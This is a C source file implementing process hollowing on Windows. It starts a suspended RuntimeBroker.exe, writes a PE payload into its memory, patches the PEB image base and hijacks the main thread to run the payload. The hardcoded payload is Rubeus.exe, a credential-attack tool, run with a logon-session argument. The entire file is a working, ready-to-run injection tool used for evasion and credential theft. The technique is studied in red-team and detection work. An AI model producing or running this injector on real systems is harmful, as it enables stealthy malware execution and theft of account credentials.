/*
 * Process Hollowing is an injection technique that injects PE payloads into the address space of a remote process.
 * The remote process is often a suspended child process created by the process hollowing implementation.
 *
 * A typical process hollowing implementation generally creates a suspended process via the CreateProcess WinAPI
 * and then calls NtUnmapViewOfSection to unmap the legitimate process image of the remote process.
 * Once that's done, NtMapViewOfSection is called to map the PE payload binary instead.
 */

#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stddef.h>
#pragma comment(lib, "WindowsApp.lib")
#pragma warning (disable:4996)
#define pWinErr(cApiName) printf("[!] %s Failed With Error Code: %lu\n", cApiName, GetLastError())
#define GET_FILENAME(cPath)			(strrchr( cPath, '\\' ) ? strrchr( cPath, '\\' ) + 1 : cPath)
#define DELETE_HANDLE(H)						\
		if (H && H != INVALID_HANDLE_VALUE) {	\
			CloseHandle(H);						\
			H = NULL;							\
		}


// Function declarations
BOOL ReadFileDisk(_In_ LPSTR cFileName, _Out_ PBYTE* ppBuffer, _Out_ PDWORD pdwFileSize);
BOOL FixMemoryPermissionPE(_In_ HANDLE hProcess, _In_ ULONG_PTR pPeBaseAddress, _In_ PIMAGE_NT_HEADERS pImgNtHdrs, _In_ PIMAGE_SECTION_HEADER pImgSecHdr);
VOID Printstdout(_In_ HANDLE StOutRead);
BOOL CreateHollowedProcess(_In_ LPSTR cRemoteProcessImage, _In_ OPTIONAL LPSTR cProcessArgs, _Out_ PPROCESS_INFORMATION pProcessInfo, _Out_ HANDLE* pStdInWrite, _Out_ HANDLE* pStdOutRead);
BOOL ReplaceBaseAddrImg(_In_ HANDLE hProcess, _In_ ULONG_PTR uPeBaseAddr, _In_ ULONG_PTR Rdx);
BOOL RemotePeExec(_In_ PBYTE pPeBuffer, _In_ LPSTR cRemoteProcessImage, _In_ OPTIONAL LPSTR cProcessArgs);


// Reads the Portable Executable (PE) payload from disk.
// cFileName    ->     Pointer to the file path of the PE payload
// ppBuffer     ->     Pointer to the base address of the PE payload in memory
// pdwFileSize  ->     Pointer to the size in bytes of the PE payload
BOOL ReadFileDisk(_In_ LPSTR cFileName, _Out_ PBYTE* ppBuffer, _Out_ PDWORD pdwFileSize) {
    // Declarations
    HANDLE hFile = INVALID_HANDLE_VALUE; // File handle
    LPVOID pBuffer = NULL;                // Buffer to store the file content
    DWORD dwFileSize, dwNumberOfBytesRead = 0; // File size and number of bytes read

    // Open the PE payload file
    if ((hFile = CreateFileA(cFileName, GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
        pWinErr("CreateFileA");
        goto _CleanUp;
    }

    // Retrieve the size in bytes of the PE payload
    if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
        pWinErr("GetFileSize");
        goto _CleanUp;
    }
    printf("[+] FileSize PE Payload: %lu\n", dwFileSize);

    // Allocate memory on the heap for the PE payload
    if ((pBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize)) == NULL) {
        pWinErr("HeapAlloc");
        goto _CleanUp;
    }

    // Read the PE payload from the file into the buffer
    if (!ReadFile(hFile, pBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
        pWinErr("ReadFile");
        goto _CleanUp;
    }

    // Update pointers with the address and size of the PE payload
    *ppBuffer = pBuffer;
    *pdwFileSize = dwFileSize;

    // Clean up resources
    _CleanUp:
    if (hFile != INVALID_HANDLE_VALUE)
        CloseHandle(hFile);
    // Return TRUE if the buffer is not NULL and the file size is not 0, otherwise return FALSE
    return ((*ppBuffer != NULL) && (*pdwFileSize != 0x00)) ? TRUE : FALSE;
}

// Function iterates over the Portable Executable (PE) payload's sections and adjusts the memory permissions for each section within a remote process using the VirtualProtectEx function.
// hProcess             -> Handle to the remote process where the PE payload should be injected
// peBaseAddress        -> Pointer to the base address of the injected PE in the remote process
// pImgNtHdrs           -> Pointer to the IMAGE_NT_HEADERS structure of the PE payload, containing information about the PE headers
// pImgSecHdr           -> Pointer to the IMAGE_SECTION_HEADER structure of the PE payload, providing details about each section in the PE file
BOOL FixMemoryPermissionPE(_In_ HANDLE hProcess, _In_ ULONG_PTR pPeBaseAddress, _In_ PIMAGE_NT_HEADERS pImgNtHdrs, _In_ PIMAGE_SECTION_HEADER pImgSecHdr) {
    // Iterate through each section of the PE image
    for (DWORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
        // Variables to store current and old memory protection, enabling adjustment of memory permissions
        DWORD dwProtection, dwOldProtection = 0x00;

        // Skip the PE section if it holds no data inside
        if (!pImgSecHdr[i].SizeOfRawData || !pImgSecHdr[i].VirtualAddress)
            continue;

        // Determine memory protection based on section characteristics
        // These characteristics are defined in the IMAGE_SECTION_HEADER structure
        if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE)
            dwProtection = PAGE_WRITECOPY;

        if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ)
            dwProtection = PAGE_READONLY;

        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwProtection = PAGE_READWRITE;

        if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
            dwProtection = PAGE_EXECUTE;

        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE))
            dwProtection = PAGE_EXECUTE_WRITECOPY;

        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwProtection = PAGE_EXECUTE_READ;

        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwProtection = PAGE_EXECUTE_READWRITE;

        // Set the determined memory protection to the PE section within the remote process
        // This allows adjusting the permissions of the memory region to control its accessibility
        if (!VirtualProtectEx(hProcess, (PVOID)(pPeBaseAddress + pImgSecHdr[i].VirtualAddress), pImgSecHdr[i].SizeOfRawData, dwProtection, &dwOldProtection)) {
            // If setting memory protection fails, print an error message and return FALSE to indicate failure
            pWinErr("VirtualProtectEx");
            return FALSE;
        }
    }
    // Return TRUE if all sections' memory permissions are successfully adjusted, otherwise return FALSE
    return TRUE;
}


// Reads data from a pipe passed in a child process and prints it to stdout.
// StOutRead   -> Handle to the read end of the pipe connected to the child process's stdout
VOID Printstdout(_In_ HANDLE StOutRead) {
    DWORD dwAvailableBytes = 0x00; // Variable to store the number of available bytes in the pipe
    PBYTE pBuffer = NULL; // Buffer to hold the data read from the pipe
    BOOL bState = TRUE; // Flag to indicate the state of the reading process

    do {
        // Check how many bytes are available for reading from the pipe
        PeekNamedPipe(StOutRead, NULL, 0, NULL, &dwAvailableBytes, NULL);

        // Allocate memory for the buffer to hold the data from the pipe
        pBuffer = (PBYTE)LocalAlloc(LPTR, (SIZE_T)dwAvailableBytes);
        if (!pBuffer)
            break;

        // Read data from the pipe into the buffer
        if (!(bState = ReadFile(StOutRead, pBuffer, dwAvailableBytes, NULL, NULL))) {
            LocalFree(pBuffer);
            break;
        }

        // Print the data read from the pipe to stdout
        printf(pBuffer);

        // Free the memory allocated for the buffer
        LocalFree(pBuffer);

    } while (bState); // Continue reading until there is no more data available in the pipe
}





// This function creates a new suspended process, initializing input and output pipes for inter-process communication, and returns the process information along with handles for writing to its standard input and reading from its standard output
// cRemoteProcessImage      -> Hold the path to the PE that will be loaded
// cProcessArgs             -> Hold Remote executable cmd parameters
// pProcessInfo             -> Pointer to PROCESS_INFORMATION struct
// pStdInWrite              -> Pointer to handle that will receive write handle(s) of the child process
// pSrdOutRead              -> Pointer to handle that will read handle fo the child process
BOOL CreateHollowedProcess(_In_ LPSTR cRemoteProcessImage, _In_ OPTIONAL LPSTR cProcessArgs, _Out_ PPROCESS_INFORMATION pProcessInfo, _Out_ HANDLE* pStdInWrite, _Out_ HANDLE* pStdOutRead) {
    STARTUPINFO					StartupInfo			= { 0x00 };
    SECURITY_ATTRIBUTES			SecAttr				= { 0x00 };
    HANDLE						StdInRead			= NULL,		// Handle for reading from the input pipe. This will be closed.
    StdInWrite			                            = NULL,		// Handle for writing to the input pipe.
    StdOutRead			                            = NULL,		// Handle for reading from the output pipe.
    StdOutWrite			                            = NULL;		// Handle for writing to the output pipe. This will be closed.
    LPCSTR						cRemoteProcessCmd	= NULL;
    BOOL						bState				= FALSE;

    // Fills process info and startup struct with 0's
    RtlSecureZeroMemory(pProcessInfo, sizeof(PROCESS_INFORMATION));
    RtlSecureZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
    RtlSecureZeroMemory(&SecAttr, sizeof(SECURITY_ATTRIBUTES));

    // Correct sizing of the SECURITY_ATTRIBUTES structure
    SecAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    // Makes sure that the new process inherits the handle
    SecAttr.bInheritHandle			= TRUE;
    // Assigned with default security descriptor associated with the access token of the calling process
    SecAttr.lpSecurityDescriptor	= NULL;

    // Initialize input pipe
    if (!CreatePipe(&StdInRead, &StdInWrite, &SecAttr, 0x00)) {
        pWinErr("CreatePipe [1]");
        goto _CleanUp;
    }

    // Initialize output pipe
    if (!CreatePipe(&StdOutRead, &StdOutWrite, &SecAttr, 0x00)) {
        pWinErr("CreatePipe [2]");
        goto _CleanUp;
    }

    // Initialize the STARTUPINFO structure for I/O redirection
    StartupInfo.cb = sizeof(STARTUPINFO);
    StartupInfo.dwFlags |= (STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES);
    StartupInfo.wShowWindow = SW_HIDE;
    StartupInfo.hStdInput = StdInRead;
    StartupInfo.hStdOutput = StartupInfo.hStdError = StdOutWrite;

    // Construct the command line for creating the process
    cRemoteProcessCmd = LocalAlloc(LPTR, (strlen(cRemoteProcessImage) + (cProcessArgs ? strlen(cProcessArgs) : 0x00) + (sizeof(CHAR) * 2)));
    if (!cRemoteProcessCmd) {
        pWinErr("LocalAlloc");
        goto _CleanUp;
    }

    // Create process
    sprintf(cRemoteProcessCmd, cProcessArgs == NULL ? "%s" : "%s %s", cRemoteProcessImage, cProcessArgs == NULL ? "" : cProcessArgs);
    if (!CreateProcessA(NULL, cRemoteProcessCmd, &SecAttr, NULL, TRUE, (CREATE_SUSPENDED | CREATE_NEW_CONSOLE), NULL, NULL, &StartupInfo, pProcessInfo)) {
        pWinErr("CreateProcessA");
        goto _CleanUp;
    }

    printf("[+] Target Process Created: PID: %lu\n", pProcessInfo->dwProcessId);

    // Update pointers
    *pStdInWrite = StdInWrite;
    *pStdOutRead = StdOutRead;

    bState = TRUE;

    _CleanUp:
    if (cRemoteProcessCmd)
        LocalFree(cRemoteProcessCmd);
    // Close handles to make it non-blocking (without getting blocked waiting for the child process to read or write data)
    // This leaves StdInWrite && StdOutRead handles open
    DELETE_HANDLE(StdInRead);
    DELETE_HANDLE(StdOutWrite);
    return bState;
}

// Function patch the ImageBaseAddress member of the PEB struct of the remote process memory, effectively patching our PE payload
// hProcess     -> Handle to remote process
// uPeBaseAddr  -> Base address of the PE payload in the remote process
// Rdx          -> RDX register, effectively patching our PE payload
BOOL ReplaceBaseAddrImg(_In_ HANDLE hProcess, _In_ ULONG_PTR uPeBaseAddr, _In_ ULONG_PTR Rdx) {
    ULONG_PTR uRemoteImageBaseOffset = 0x00; // Offset of the Image base address in the PEB struct
    SIZE_T NumberOfBytesWritten = 0x00;     // Number of bytes written during memory write operation

    // Calculate the offset of the ImageBaseAddress in the PEB struct
    // Context.rdx + offsetof = PPEB->Reserved3[1] which is ImageBaseAddress
    uRemoteImageBaseOffset = (ULONG_PTR)((PBYTE)Rdx + offsetof(PEB, Reserved3[1]));

    printf("[+] Press <Enter> To Overwrite ImageBaseAddress\n");
    getchar();

    // Write the remote image base into the remote process memory
    if (!WriteProcessMemory(hProcess, (PVOID)uRemoteImageBaseOffset, &uPeBaseAddr, sizeof(PVOID), &NumberOfBytesWritten) || sizeof(PVOID) != NumberOfBytesWritten) {
        pWinErr("WriteProcessMemory");
        return FALSE;
    }
    return TRUE;
}

// Function Executes a Portable Executable (PE) payload within a remote process
// pPeBuffer                ->  Pointer to the buffer containing the PE payload
// cRemoteProcessImage      ->  Path to the target process image
// cProcessArgs             ->  Optional CMD arguments for the target process
BOOL RemotePeExec(_In_ PBYTE pPeBuffer, _In_ LPSTR cRemoteProcessImage, _In_ OPTIONAL LPSTR cProcessArgs) {
    if (!pPeBuffer || !cRemoteProcessImage)
        return FALSE;

    PROCESS_INFORMATION ProcessInfo = { 0x00 };             // Information about the remote process
    CONTEXT Context = { .ContextFlags = CONTEXT_ALL };      // Context of the main thread in the remote process
    HANDLE StdInWrite = NULL, StdOutRead = NULL;            // Handles for inter-process communication
    PBYTE pRemoteAddress = NULL;                            // Remote address where the payload will be loaded
    PIMAGE_NT_HEADERS pImgNtHdrs = NULL;                    // Pointer to PE image headers
    PIMAGE_SECTION_HEADER pImgSecHdr = NULL;                // Pointer to section headers
    SIZE_T NumberOfBytesWritten = 0;                        // Number of bytes written during memory write operations
    BOOL bState = FALSE;                                    // State of the execution process


    // Create the hollowed process
    if (!CreateHollowedProcess(cRemoteProcessImage, cProcessArgs, &ProcessInfo, &StdInWrite, &StdOutRead))
        goto _CleanUp;

    // Check if Process handle and handle to thread are not empty
    if (!ProcessInfo.hProcess || !ProcessInfo.hThread)
        goto _CleanUp;

    printf("[+] Press <Enter> To Continue... \n");
    getchar();


    // Retrieve NT image headers 
    pImgNtHdrs = (PIMAGE_NT_HEADERS)((ULONG_PTR)pPeBuffer + ((PIMAGE_DOS_HEADER)pPeBuffer)->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] Invalid NT Image Headers\n");
        goto _CleanUp;
    }

    // Allocate remote virtual memory
    if (!(pRemoteAddress = VirtualAllocEx(ProcessInfo.hProcess, (LPVOID)pImgNtHdrs->OptionalHeader.ImageBase, (SIZE_T)pImgNtHdrs->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
        pWinErr("VirtualAllocEx");
        goto _CleanUp;
    }

    printf("[+] Remote Image Base Address: 0x%p\n", pRemoteAddress);
    printf("[+] Preferable Base Address: 0x%p\n", (LPVOID)pImgNtHdrs->OptionalHeader.ImageBase);


    // Check if the image base is the same as the one in the headers
    if (pRemoteAddress != (LPVOID)pImgNtHdrs->OptionalHeader.ImageBase) {
        printf("[!] PE Payload Will Require Relocation - [NOT SUPPORTED]\n");
        goto _CleanUp;
    }

    printf("[+] Press <Enter> To Write The PE Payload ... \n");
    getchar();

    // Copy over image header
    if (!WriteProcessMemory(ProcessInfo.hProcess, pRemoteAddress, pPeBuffer, pImgNtHdrs->OptionalHeader.SizeOfHeaders, &NumberOfBytesWritten) || pImgNtHdrs->OptionalHeader.SizeOfHeaders != NumberOfBytesWritten) {
        pWinErr("WriteProcessMemory");
        goto _CleanUp;
    }

    printf("[+] Wrote Headers At %p Of Size %d \n", (void*)pRemoteAddress, (int)pImgNtHdrs->OptionalHeader.SizeOfHeaders);
    printf("[+] Writing Sections ... \n");

    // Copy over sections 
    pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);
    for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

        printf("\t<i> Writing Section %s At %p Of Size %d \n", pImgSecHdr[i].Name, (void*)(pRemoteAddress + pImgSecHdr[i].VirtualAddress), (int)pImgSecHdr[i].SizeOfRawData);

        if (!WriteProcessMemory(ProcessInfo.hProcess, (PVOID)(pRemoteAddress + pImgSecHdr[i].VirtualAddress), (PVOID)(pPeBuffer + pImgSecHdr[i].PointerToRawData), pImgSecHdr[i].SizeOfRawData, &NumberOfBytesWritten) || pImgSecHdr[i].SizeOfRawData != NumberOfBytesWritten) {
            pWinErr("WriteProcessMemory");
            goto _CleanUp;
        }
    }


    // Get thread context of the main thread
    if (!GetThreadContext(ProcessInfo.hThread, &Context)) {
        pWinErr("GetThreadContext");
        goto _CleanUp;
    }

    // Patch the 'ImageBaseAddress' element in the 'PEB' structure of the remote process to point to our PE instead
    if (!ReplaceBaseAddrImg(ProcessInfo.hProcess, (ULONG_PTR)pRemoteAddress, Context.Rdx)) {
        goto _CleanUp;
    }

    // Set suitable memory permissions
    if (!FixMemoryPermissionPE(ProcessInfo.hProcess, (ULONG_PTR)pRemoteAddress, pImgNtHdrs, pImgSecHdr))
        goto _CleanUp;

    printf("[+] Press <Enter> To Execute The Entry Payload ... \n");
    getchar();
    printf("[+] Hijacking Thread To Run EntryPoint: 0x%p ... \n", (LPVOID)(pRemoteAddress + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint));

    // Thread Hijacking:
    Context.Rcx = (DWORD64)(pRemoteAddress + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);
    if (!SetThreadContext(ProcessInfo.hThread, &Context)) {
        pWinErr("SetThreadContext");
        goto _CleanUp;
    }


    printf("[+] Press <Enter> To Resume The Process ... \n");
    getchar();

    // Resume thread
    if (ResumeThread(ProcessInfo.hThread) == ((DWORD)-1)) {
        pWinErr("ResumeThread");
        goto _CleanUp;
    }

    // Wait till the process runs the code
    WaitForSingleObject(ProcessInfo.hProcess, INFINITE);

    // Read output
    printf("[+] Reading output: \n\n");
    Printstdout(StdOutRead);

    bState = TRUE;

    _CleanUp:
    DELETE_HANDLE(StdInWrite);
    DELETE_HANDLE(StdOutRead);
    DELETE_HANDLE(ProcessInfo.hProcess);
    DELETE_HANDLE(ProcessInfo.hThread);
    return bState;
}

#define PAYLOAD     "C:\\Users\\D3v\\Downloads\\Rubeus-1.6.4\\Rubeus-1.6.4\\Rubeus\\bin\\Release\\Rubeus.exe"
#define TPROCESS    "C:\\Windows\\System32\\RuntimeBroker.exe"
#define Args	    "logonsession"

int main() {
    PBYTE pBuffer = NULL;
    DWORD dwBuffer = 0x00;

    if (!ReadFileDisk(PAYLOAD, &pBuffer, &dwBuffer)) {
        return -1;
    }

    return RemotePeExec(pBuffer, TPROCESS, Args) ? 0 : -1;
}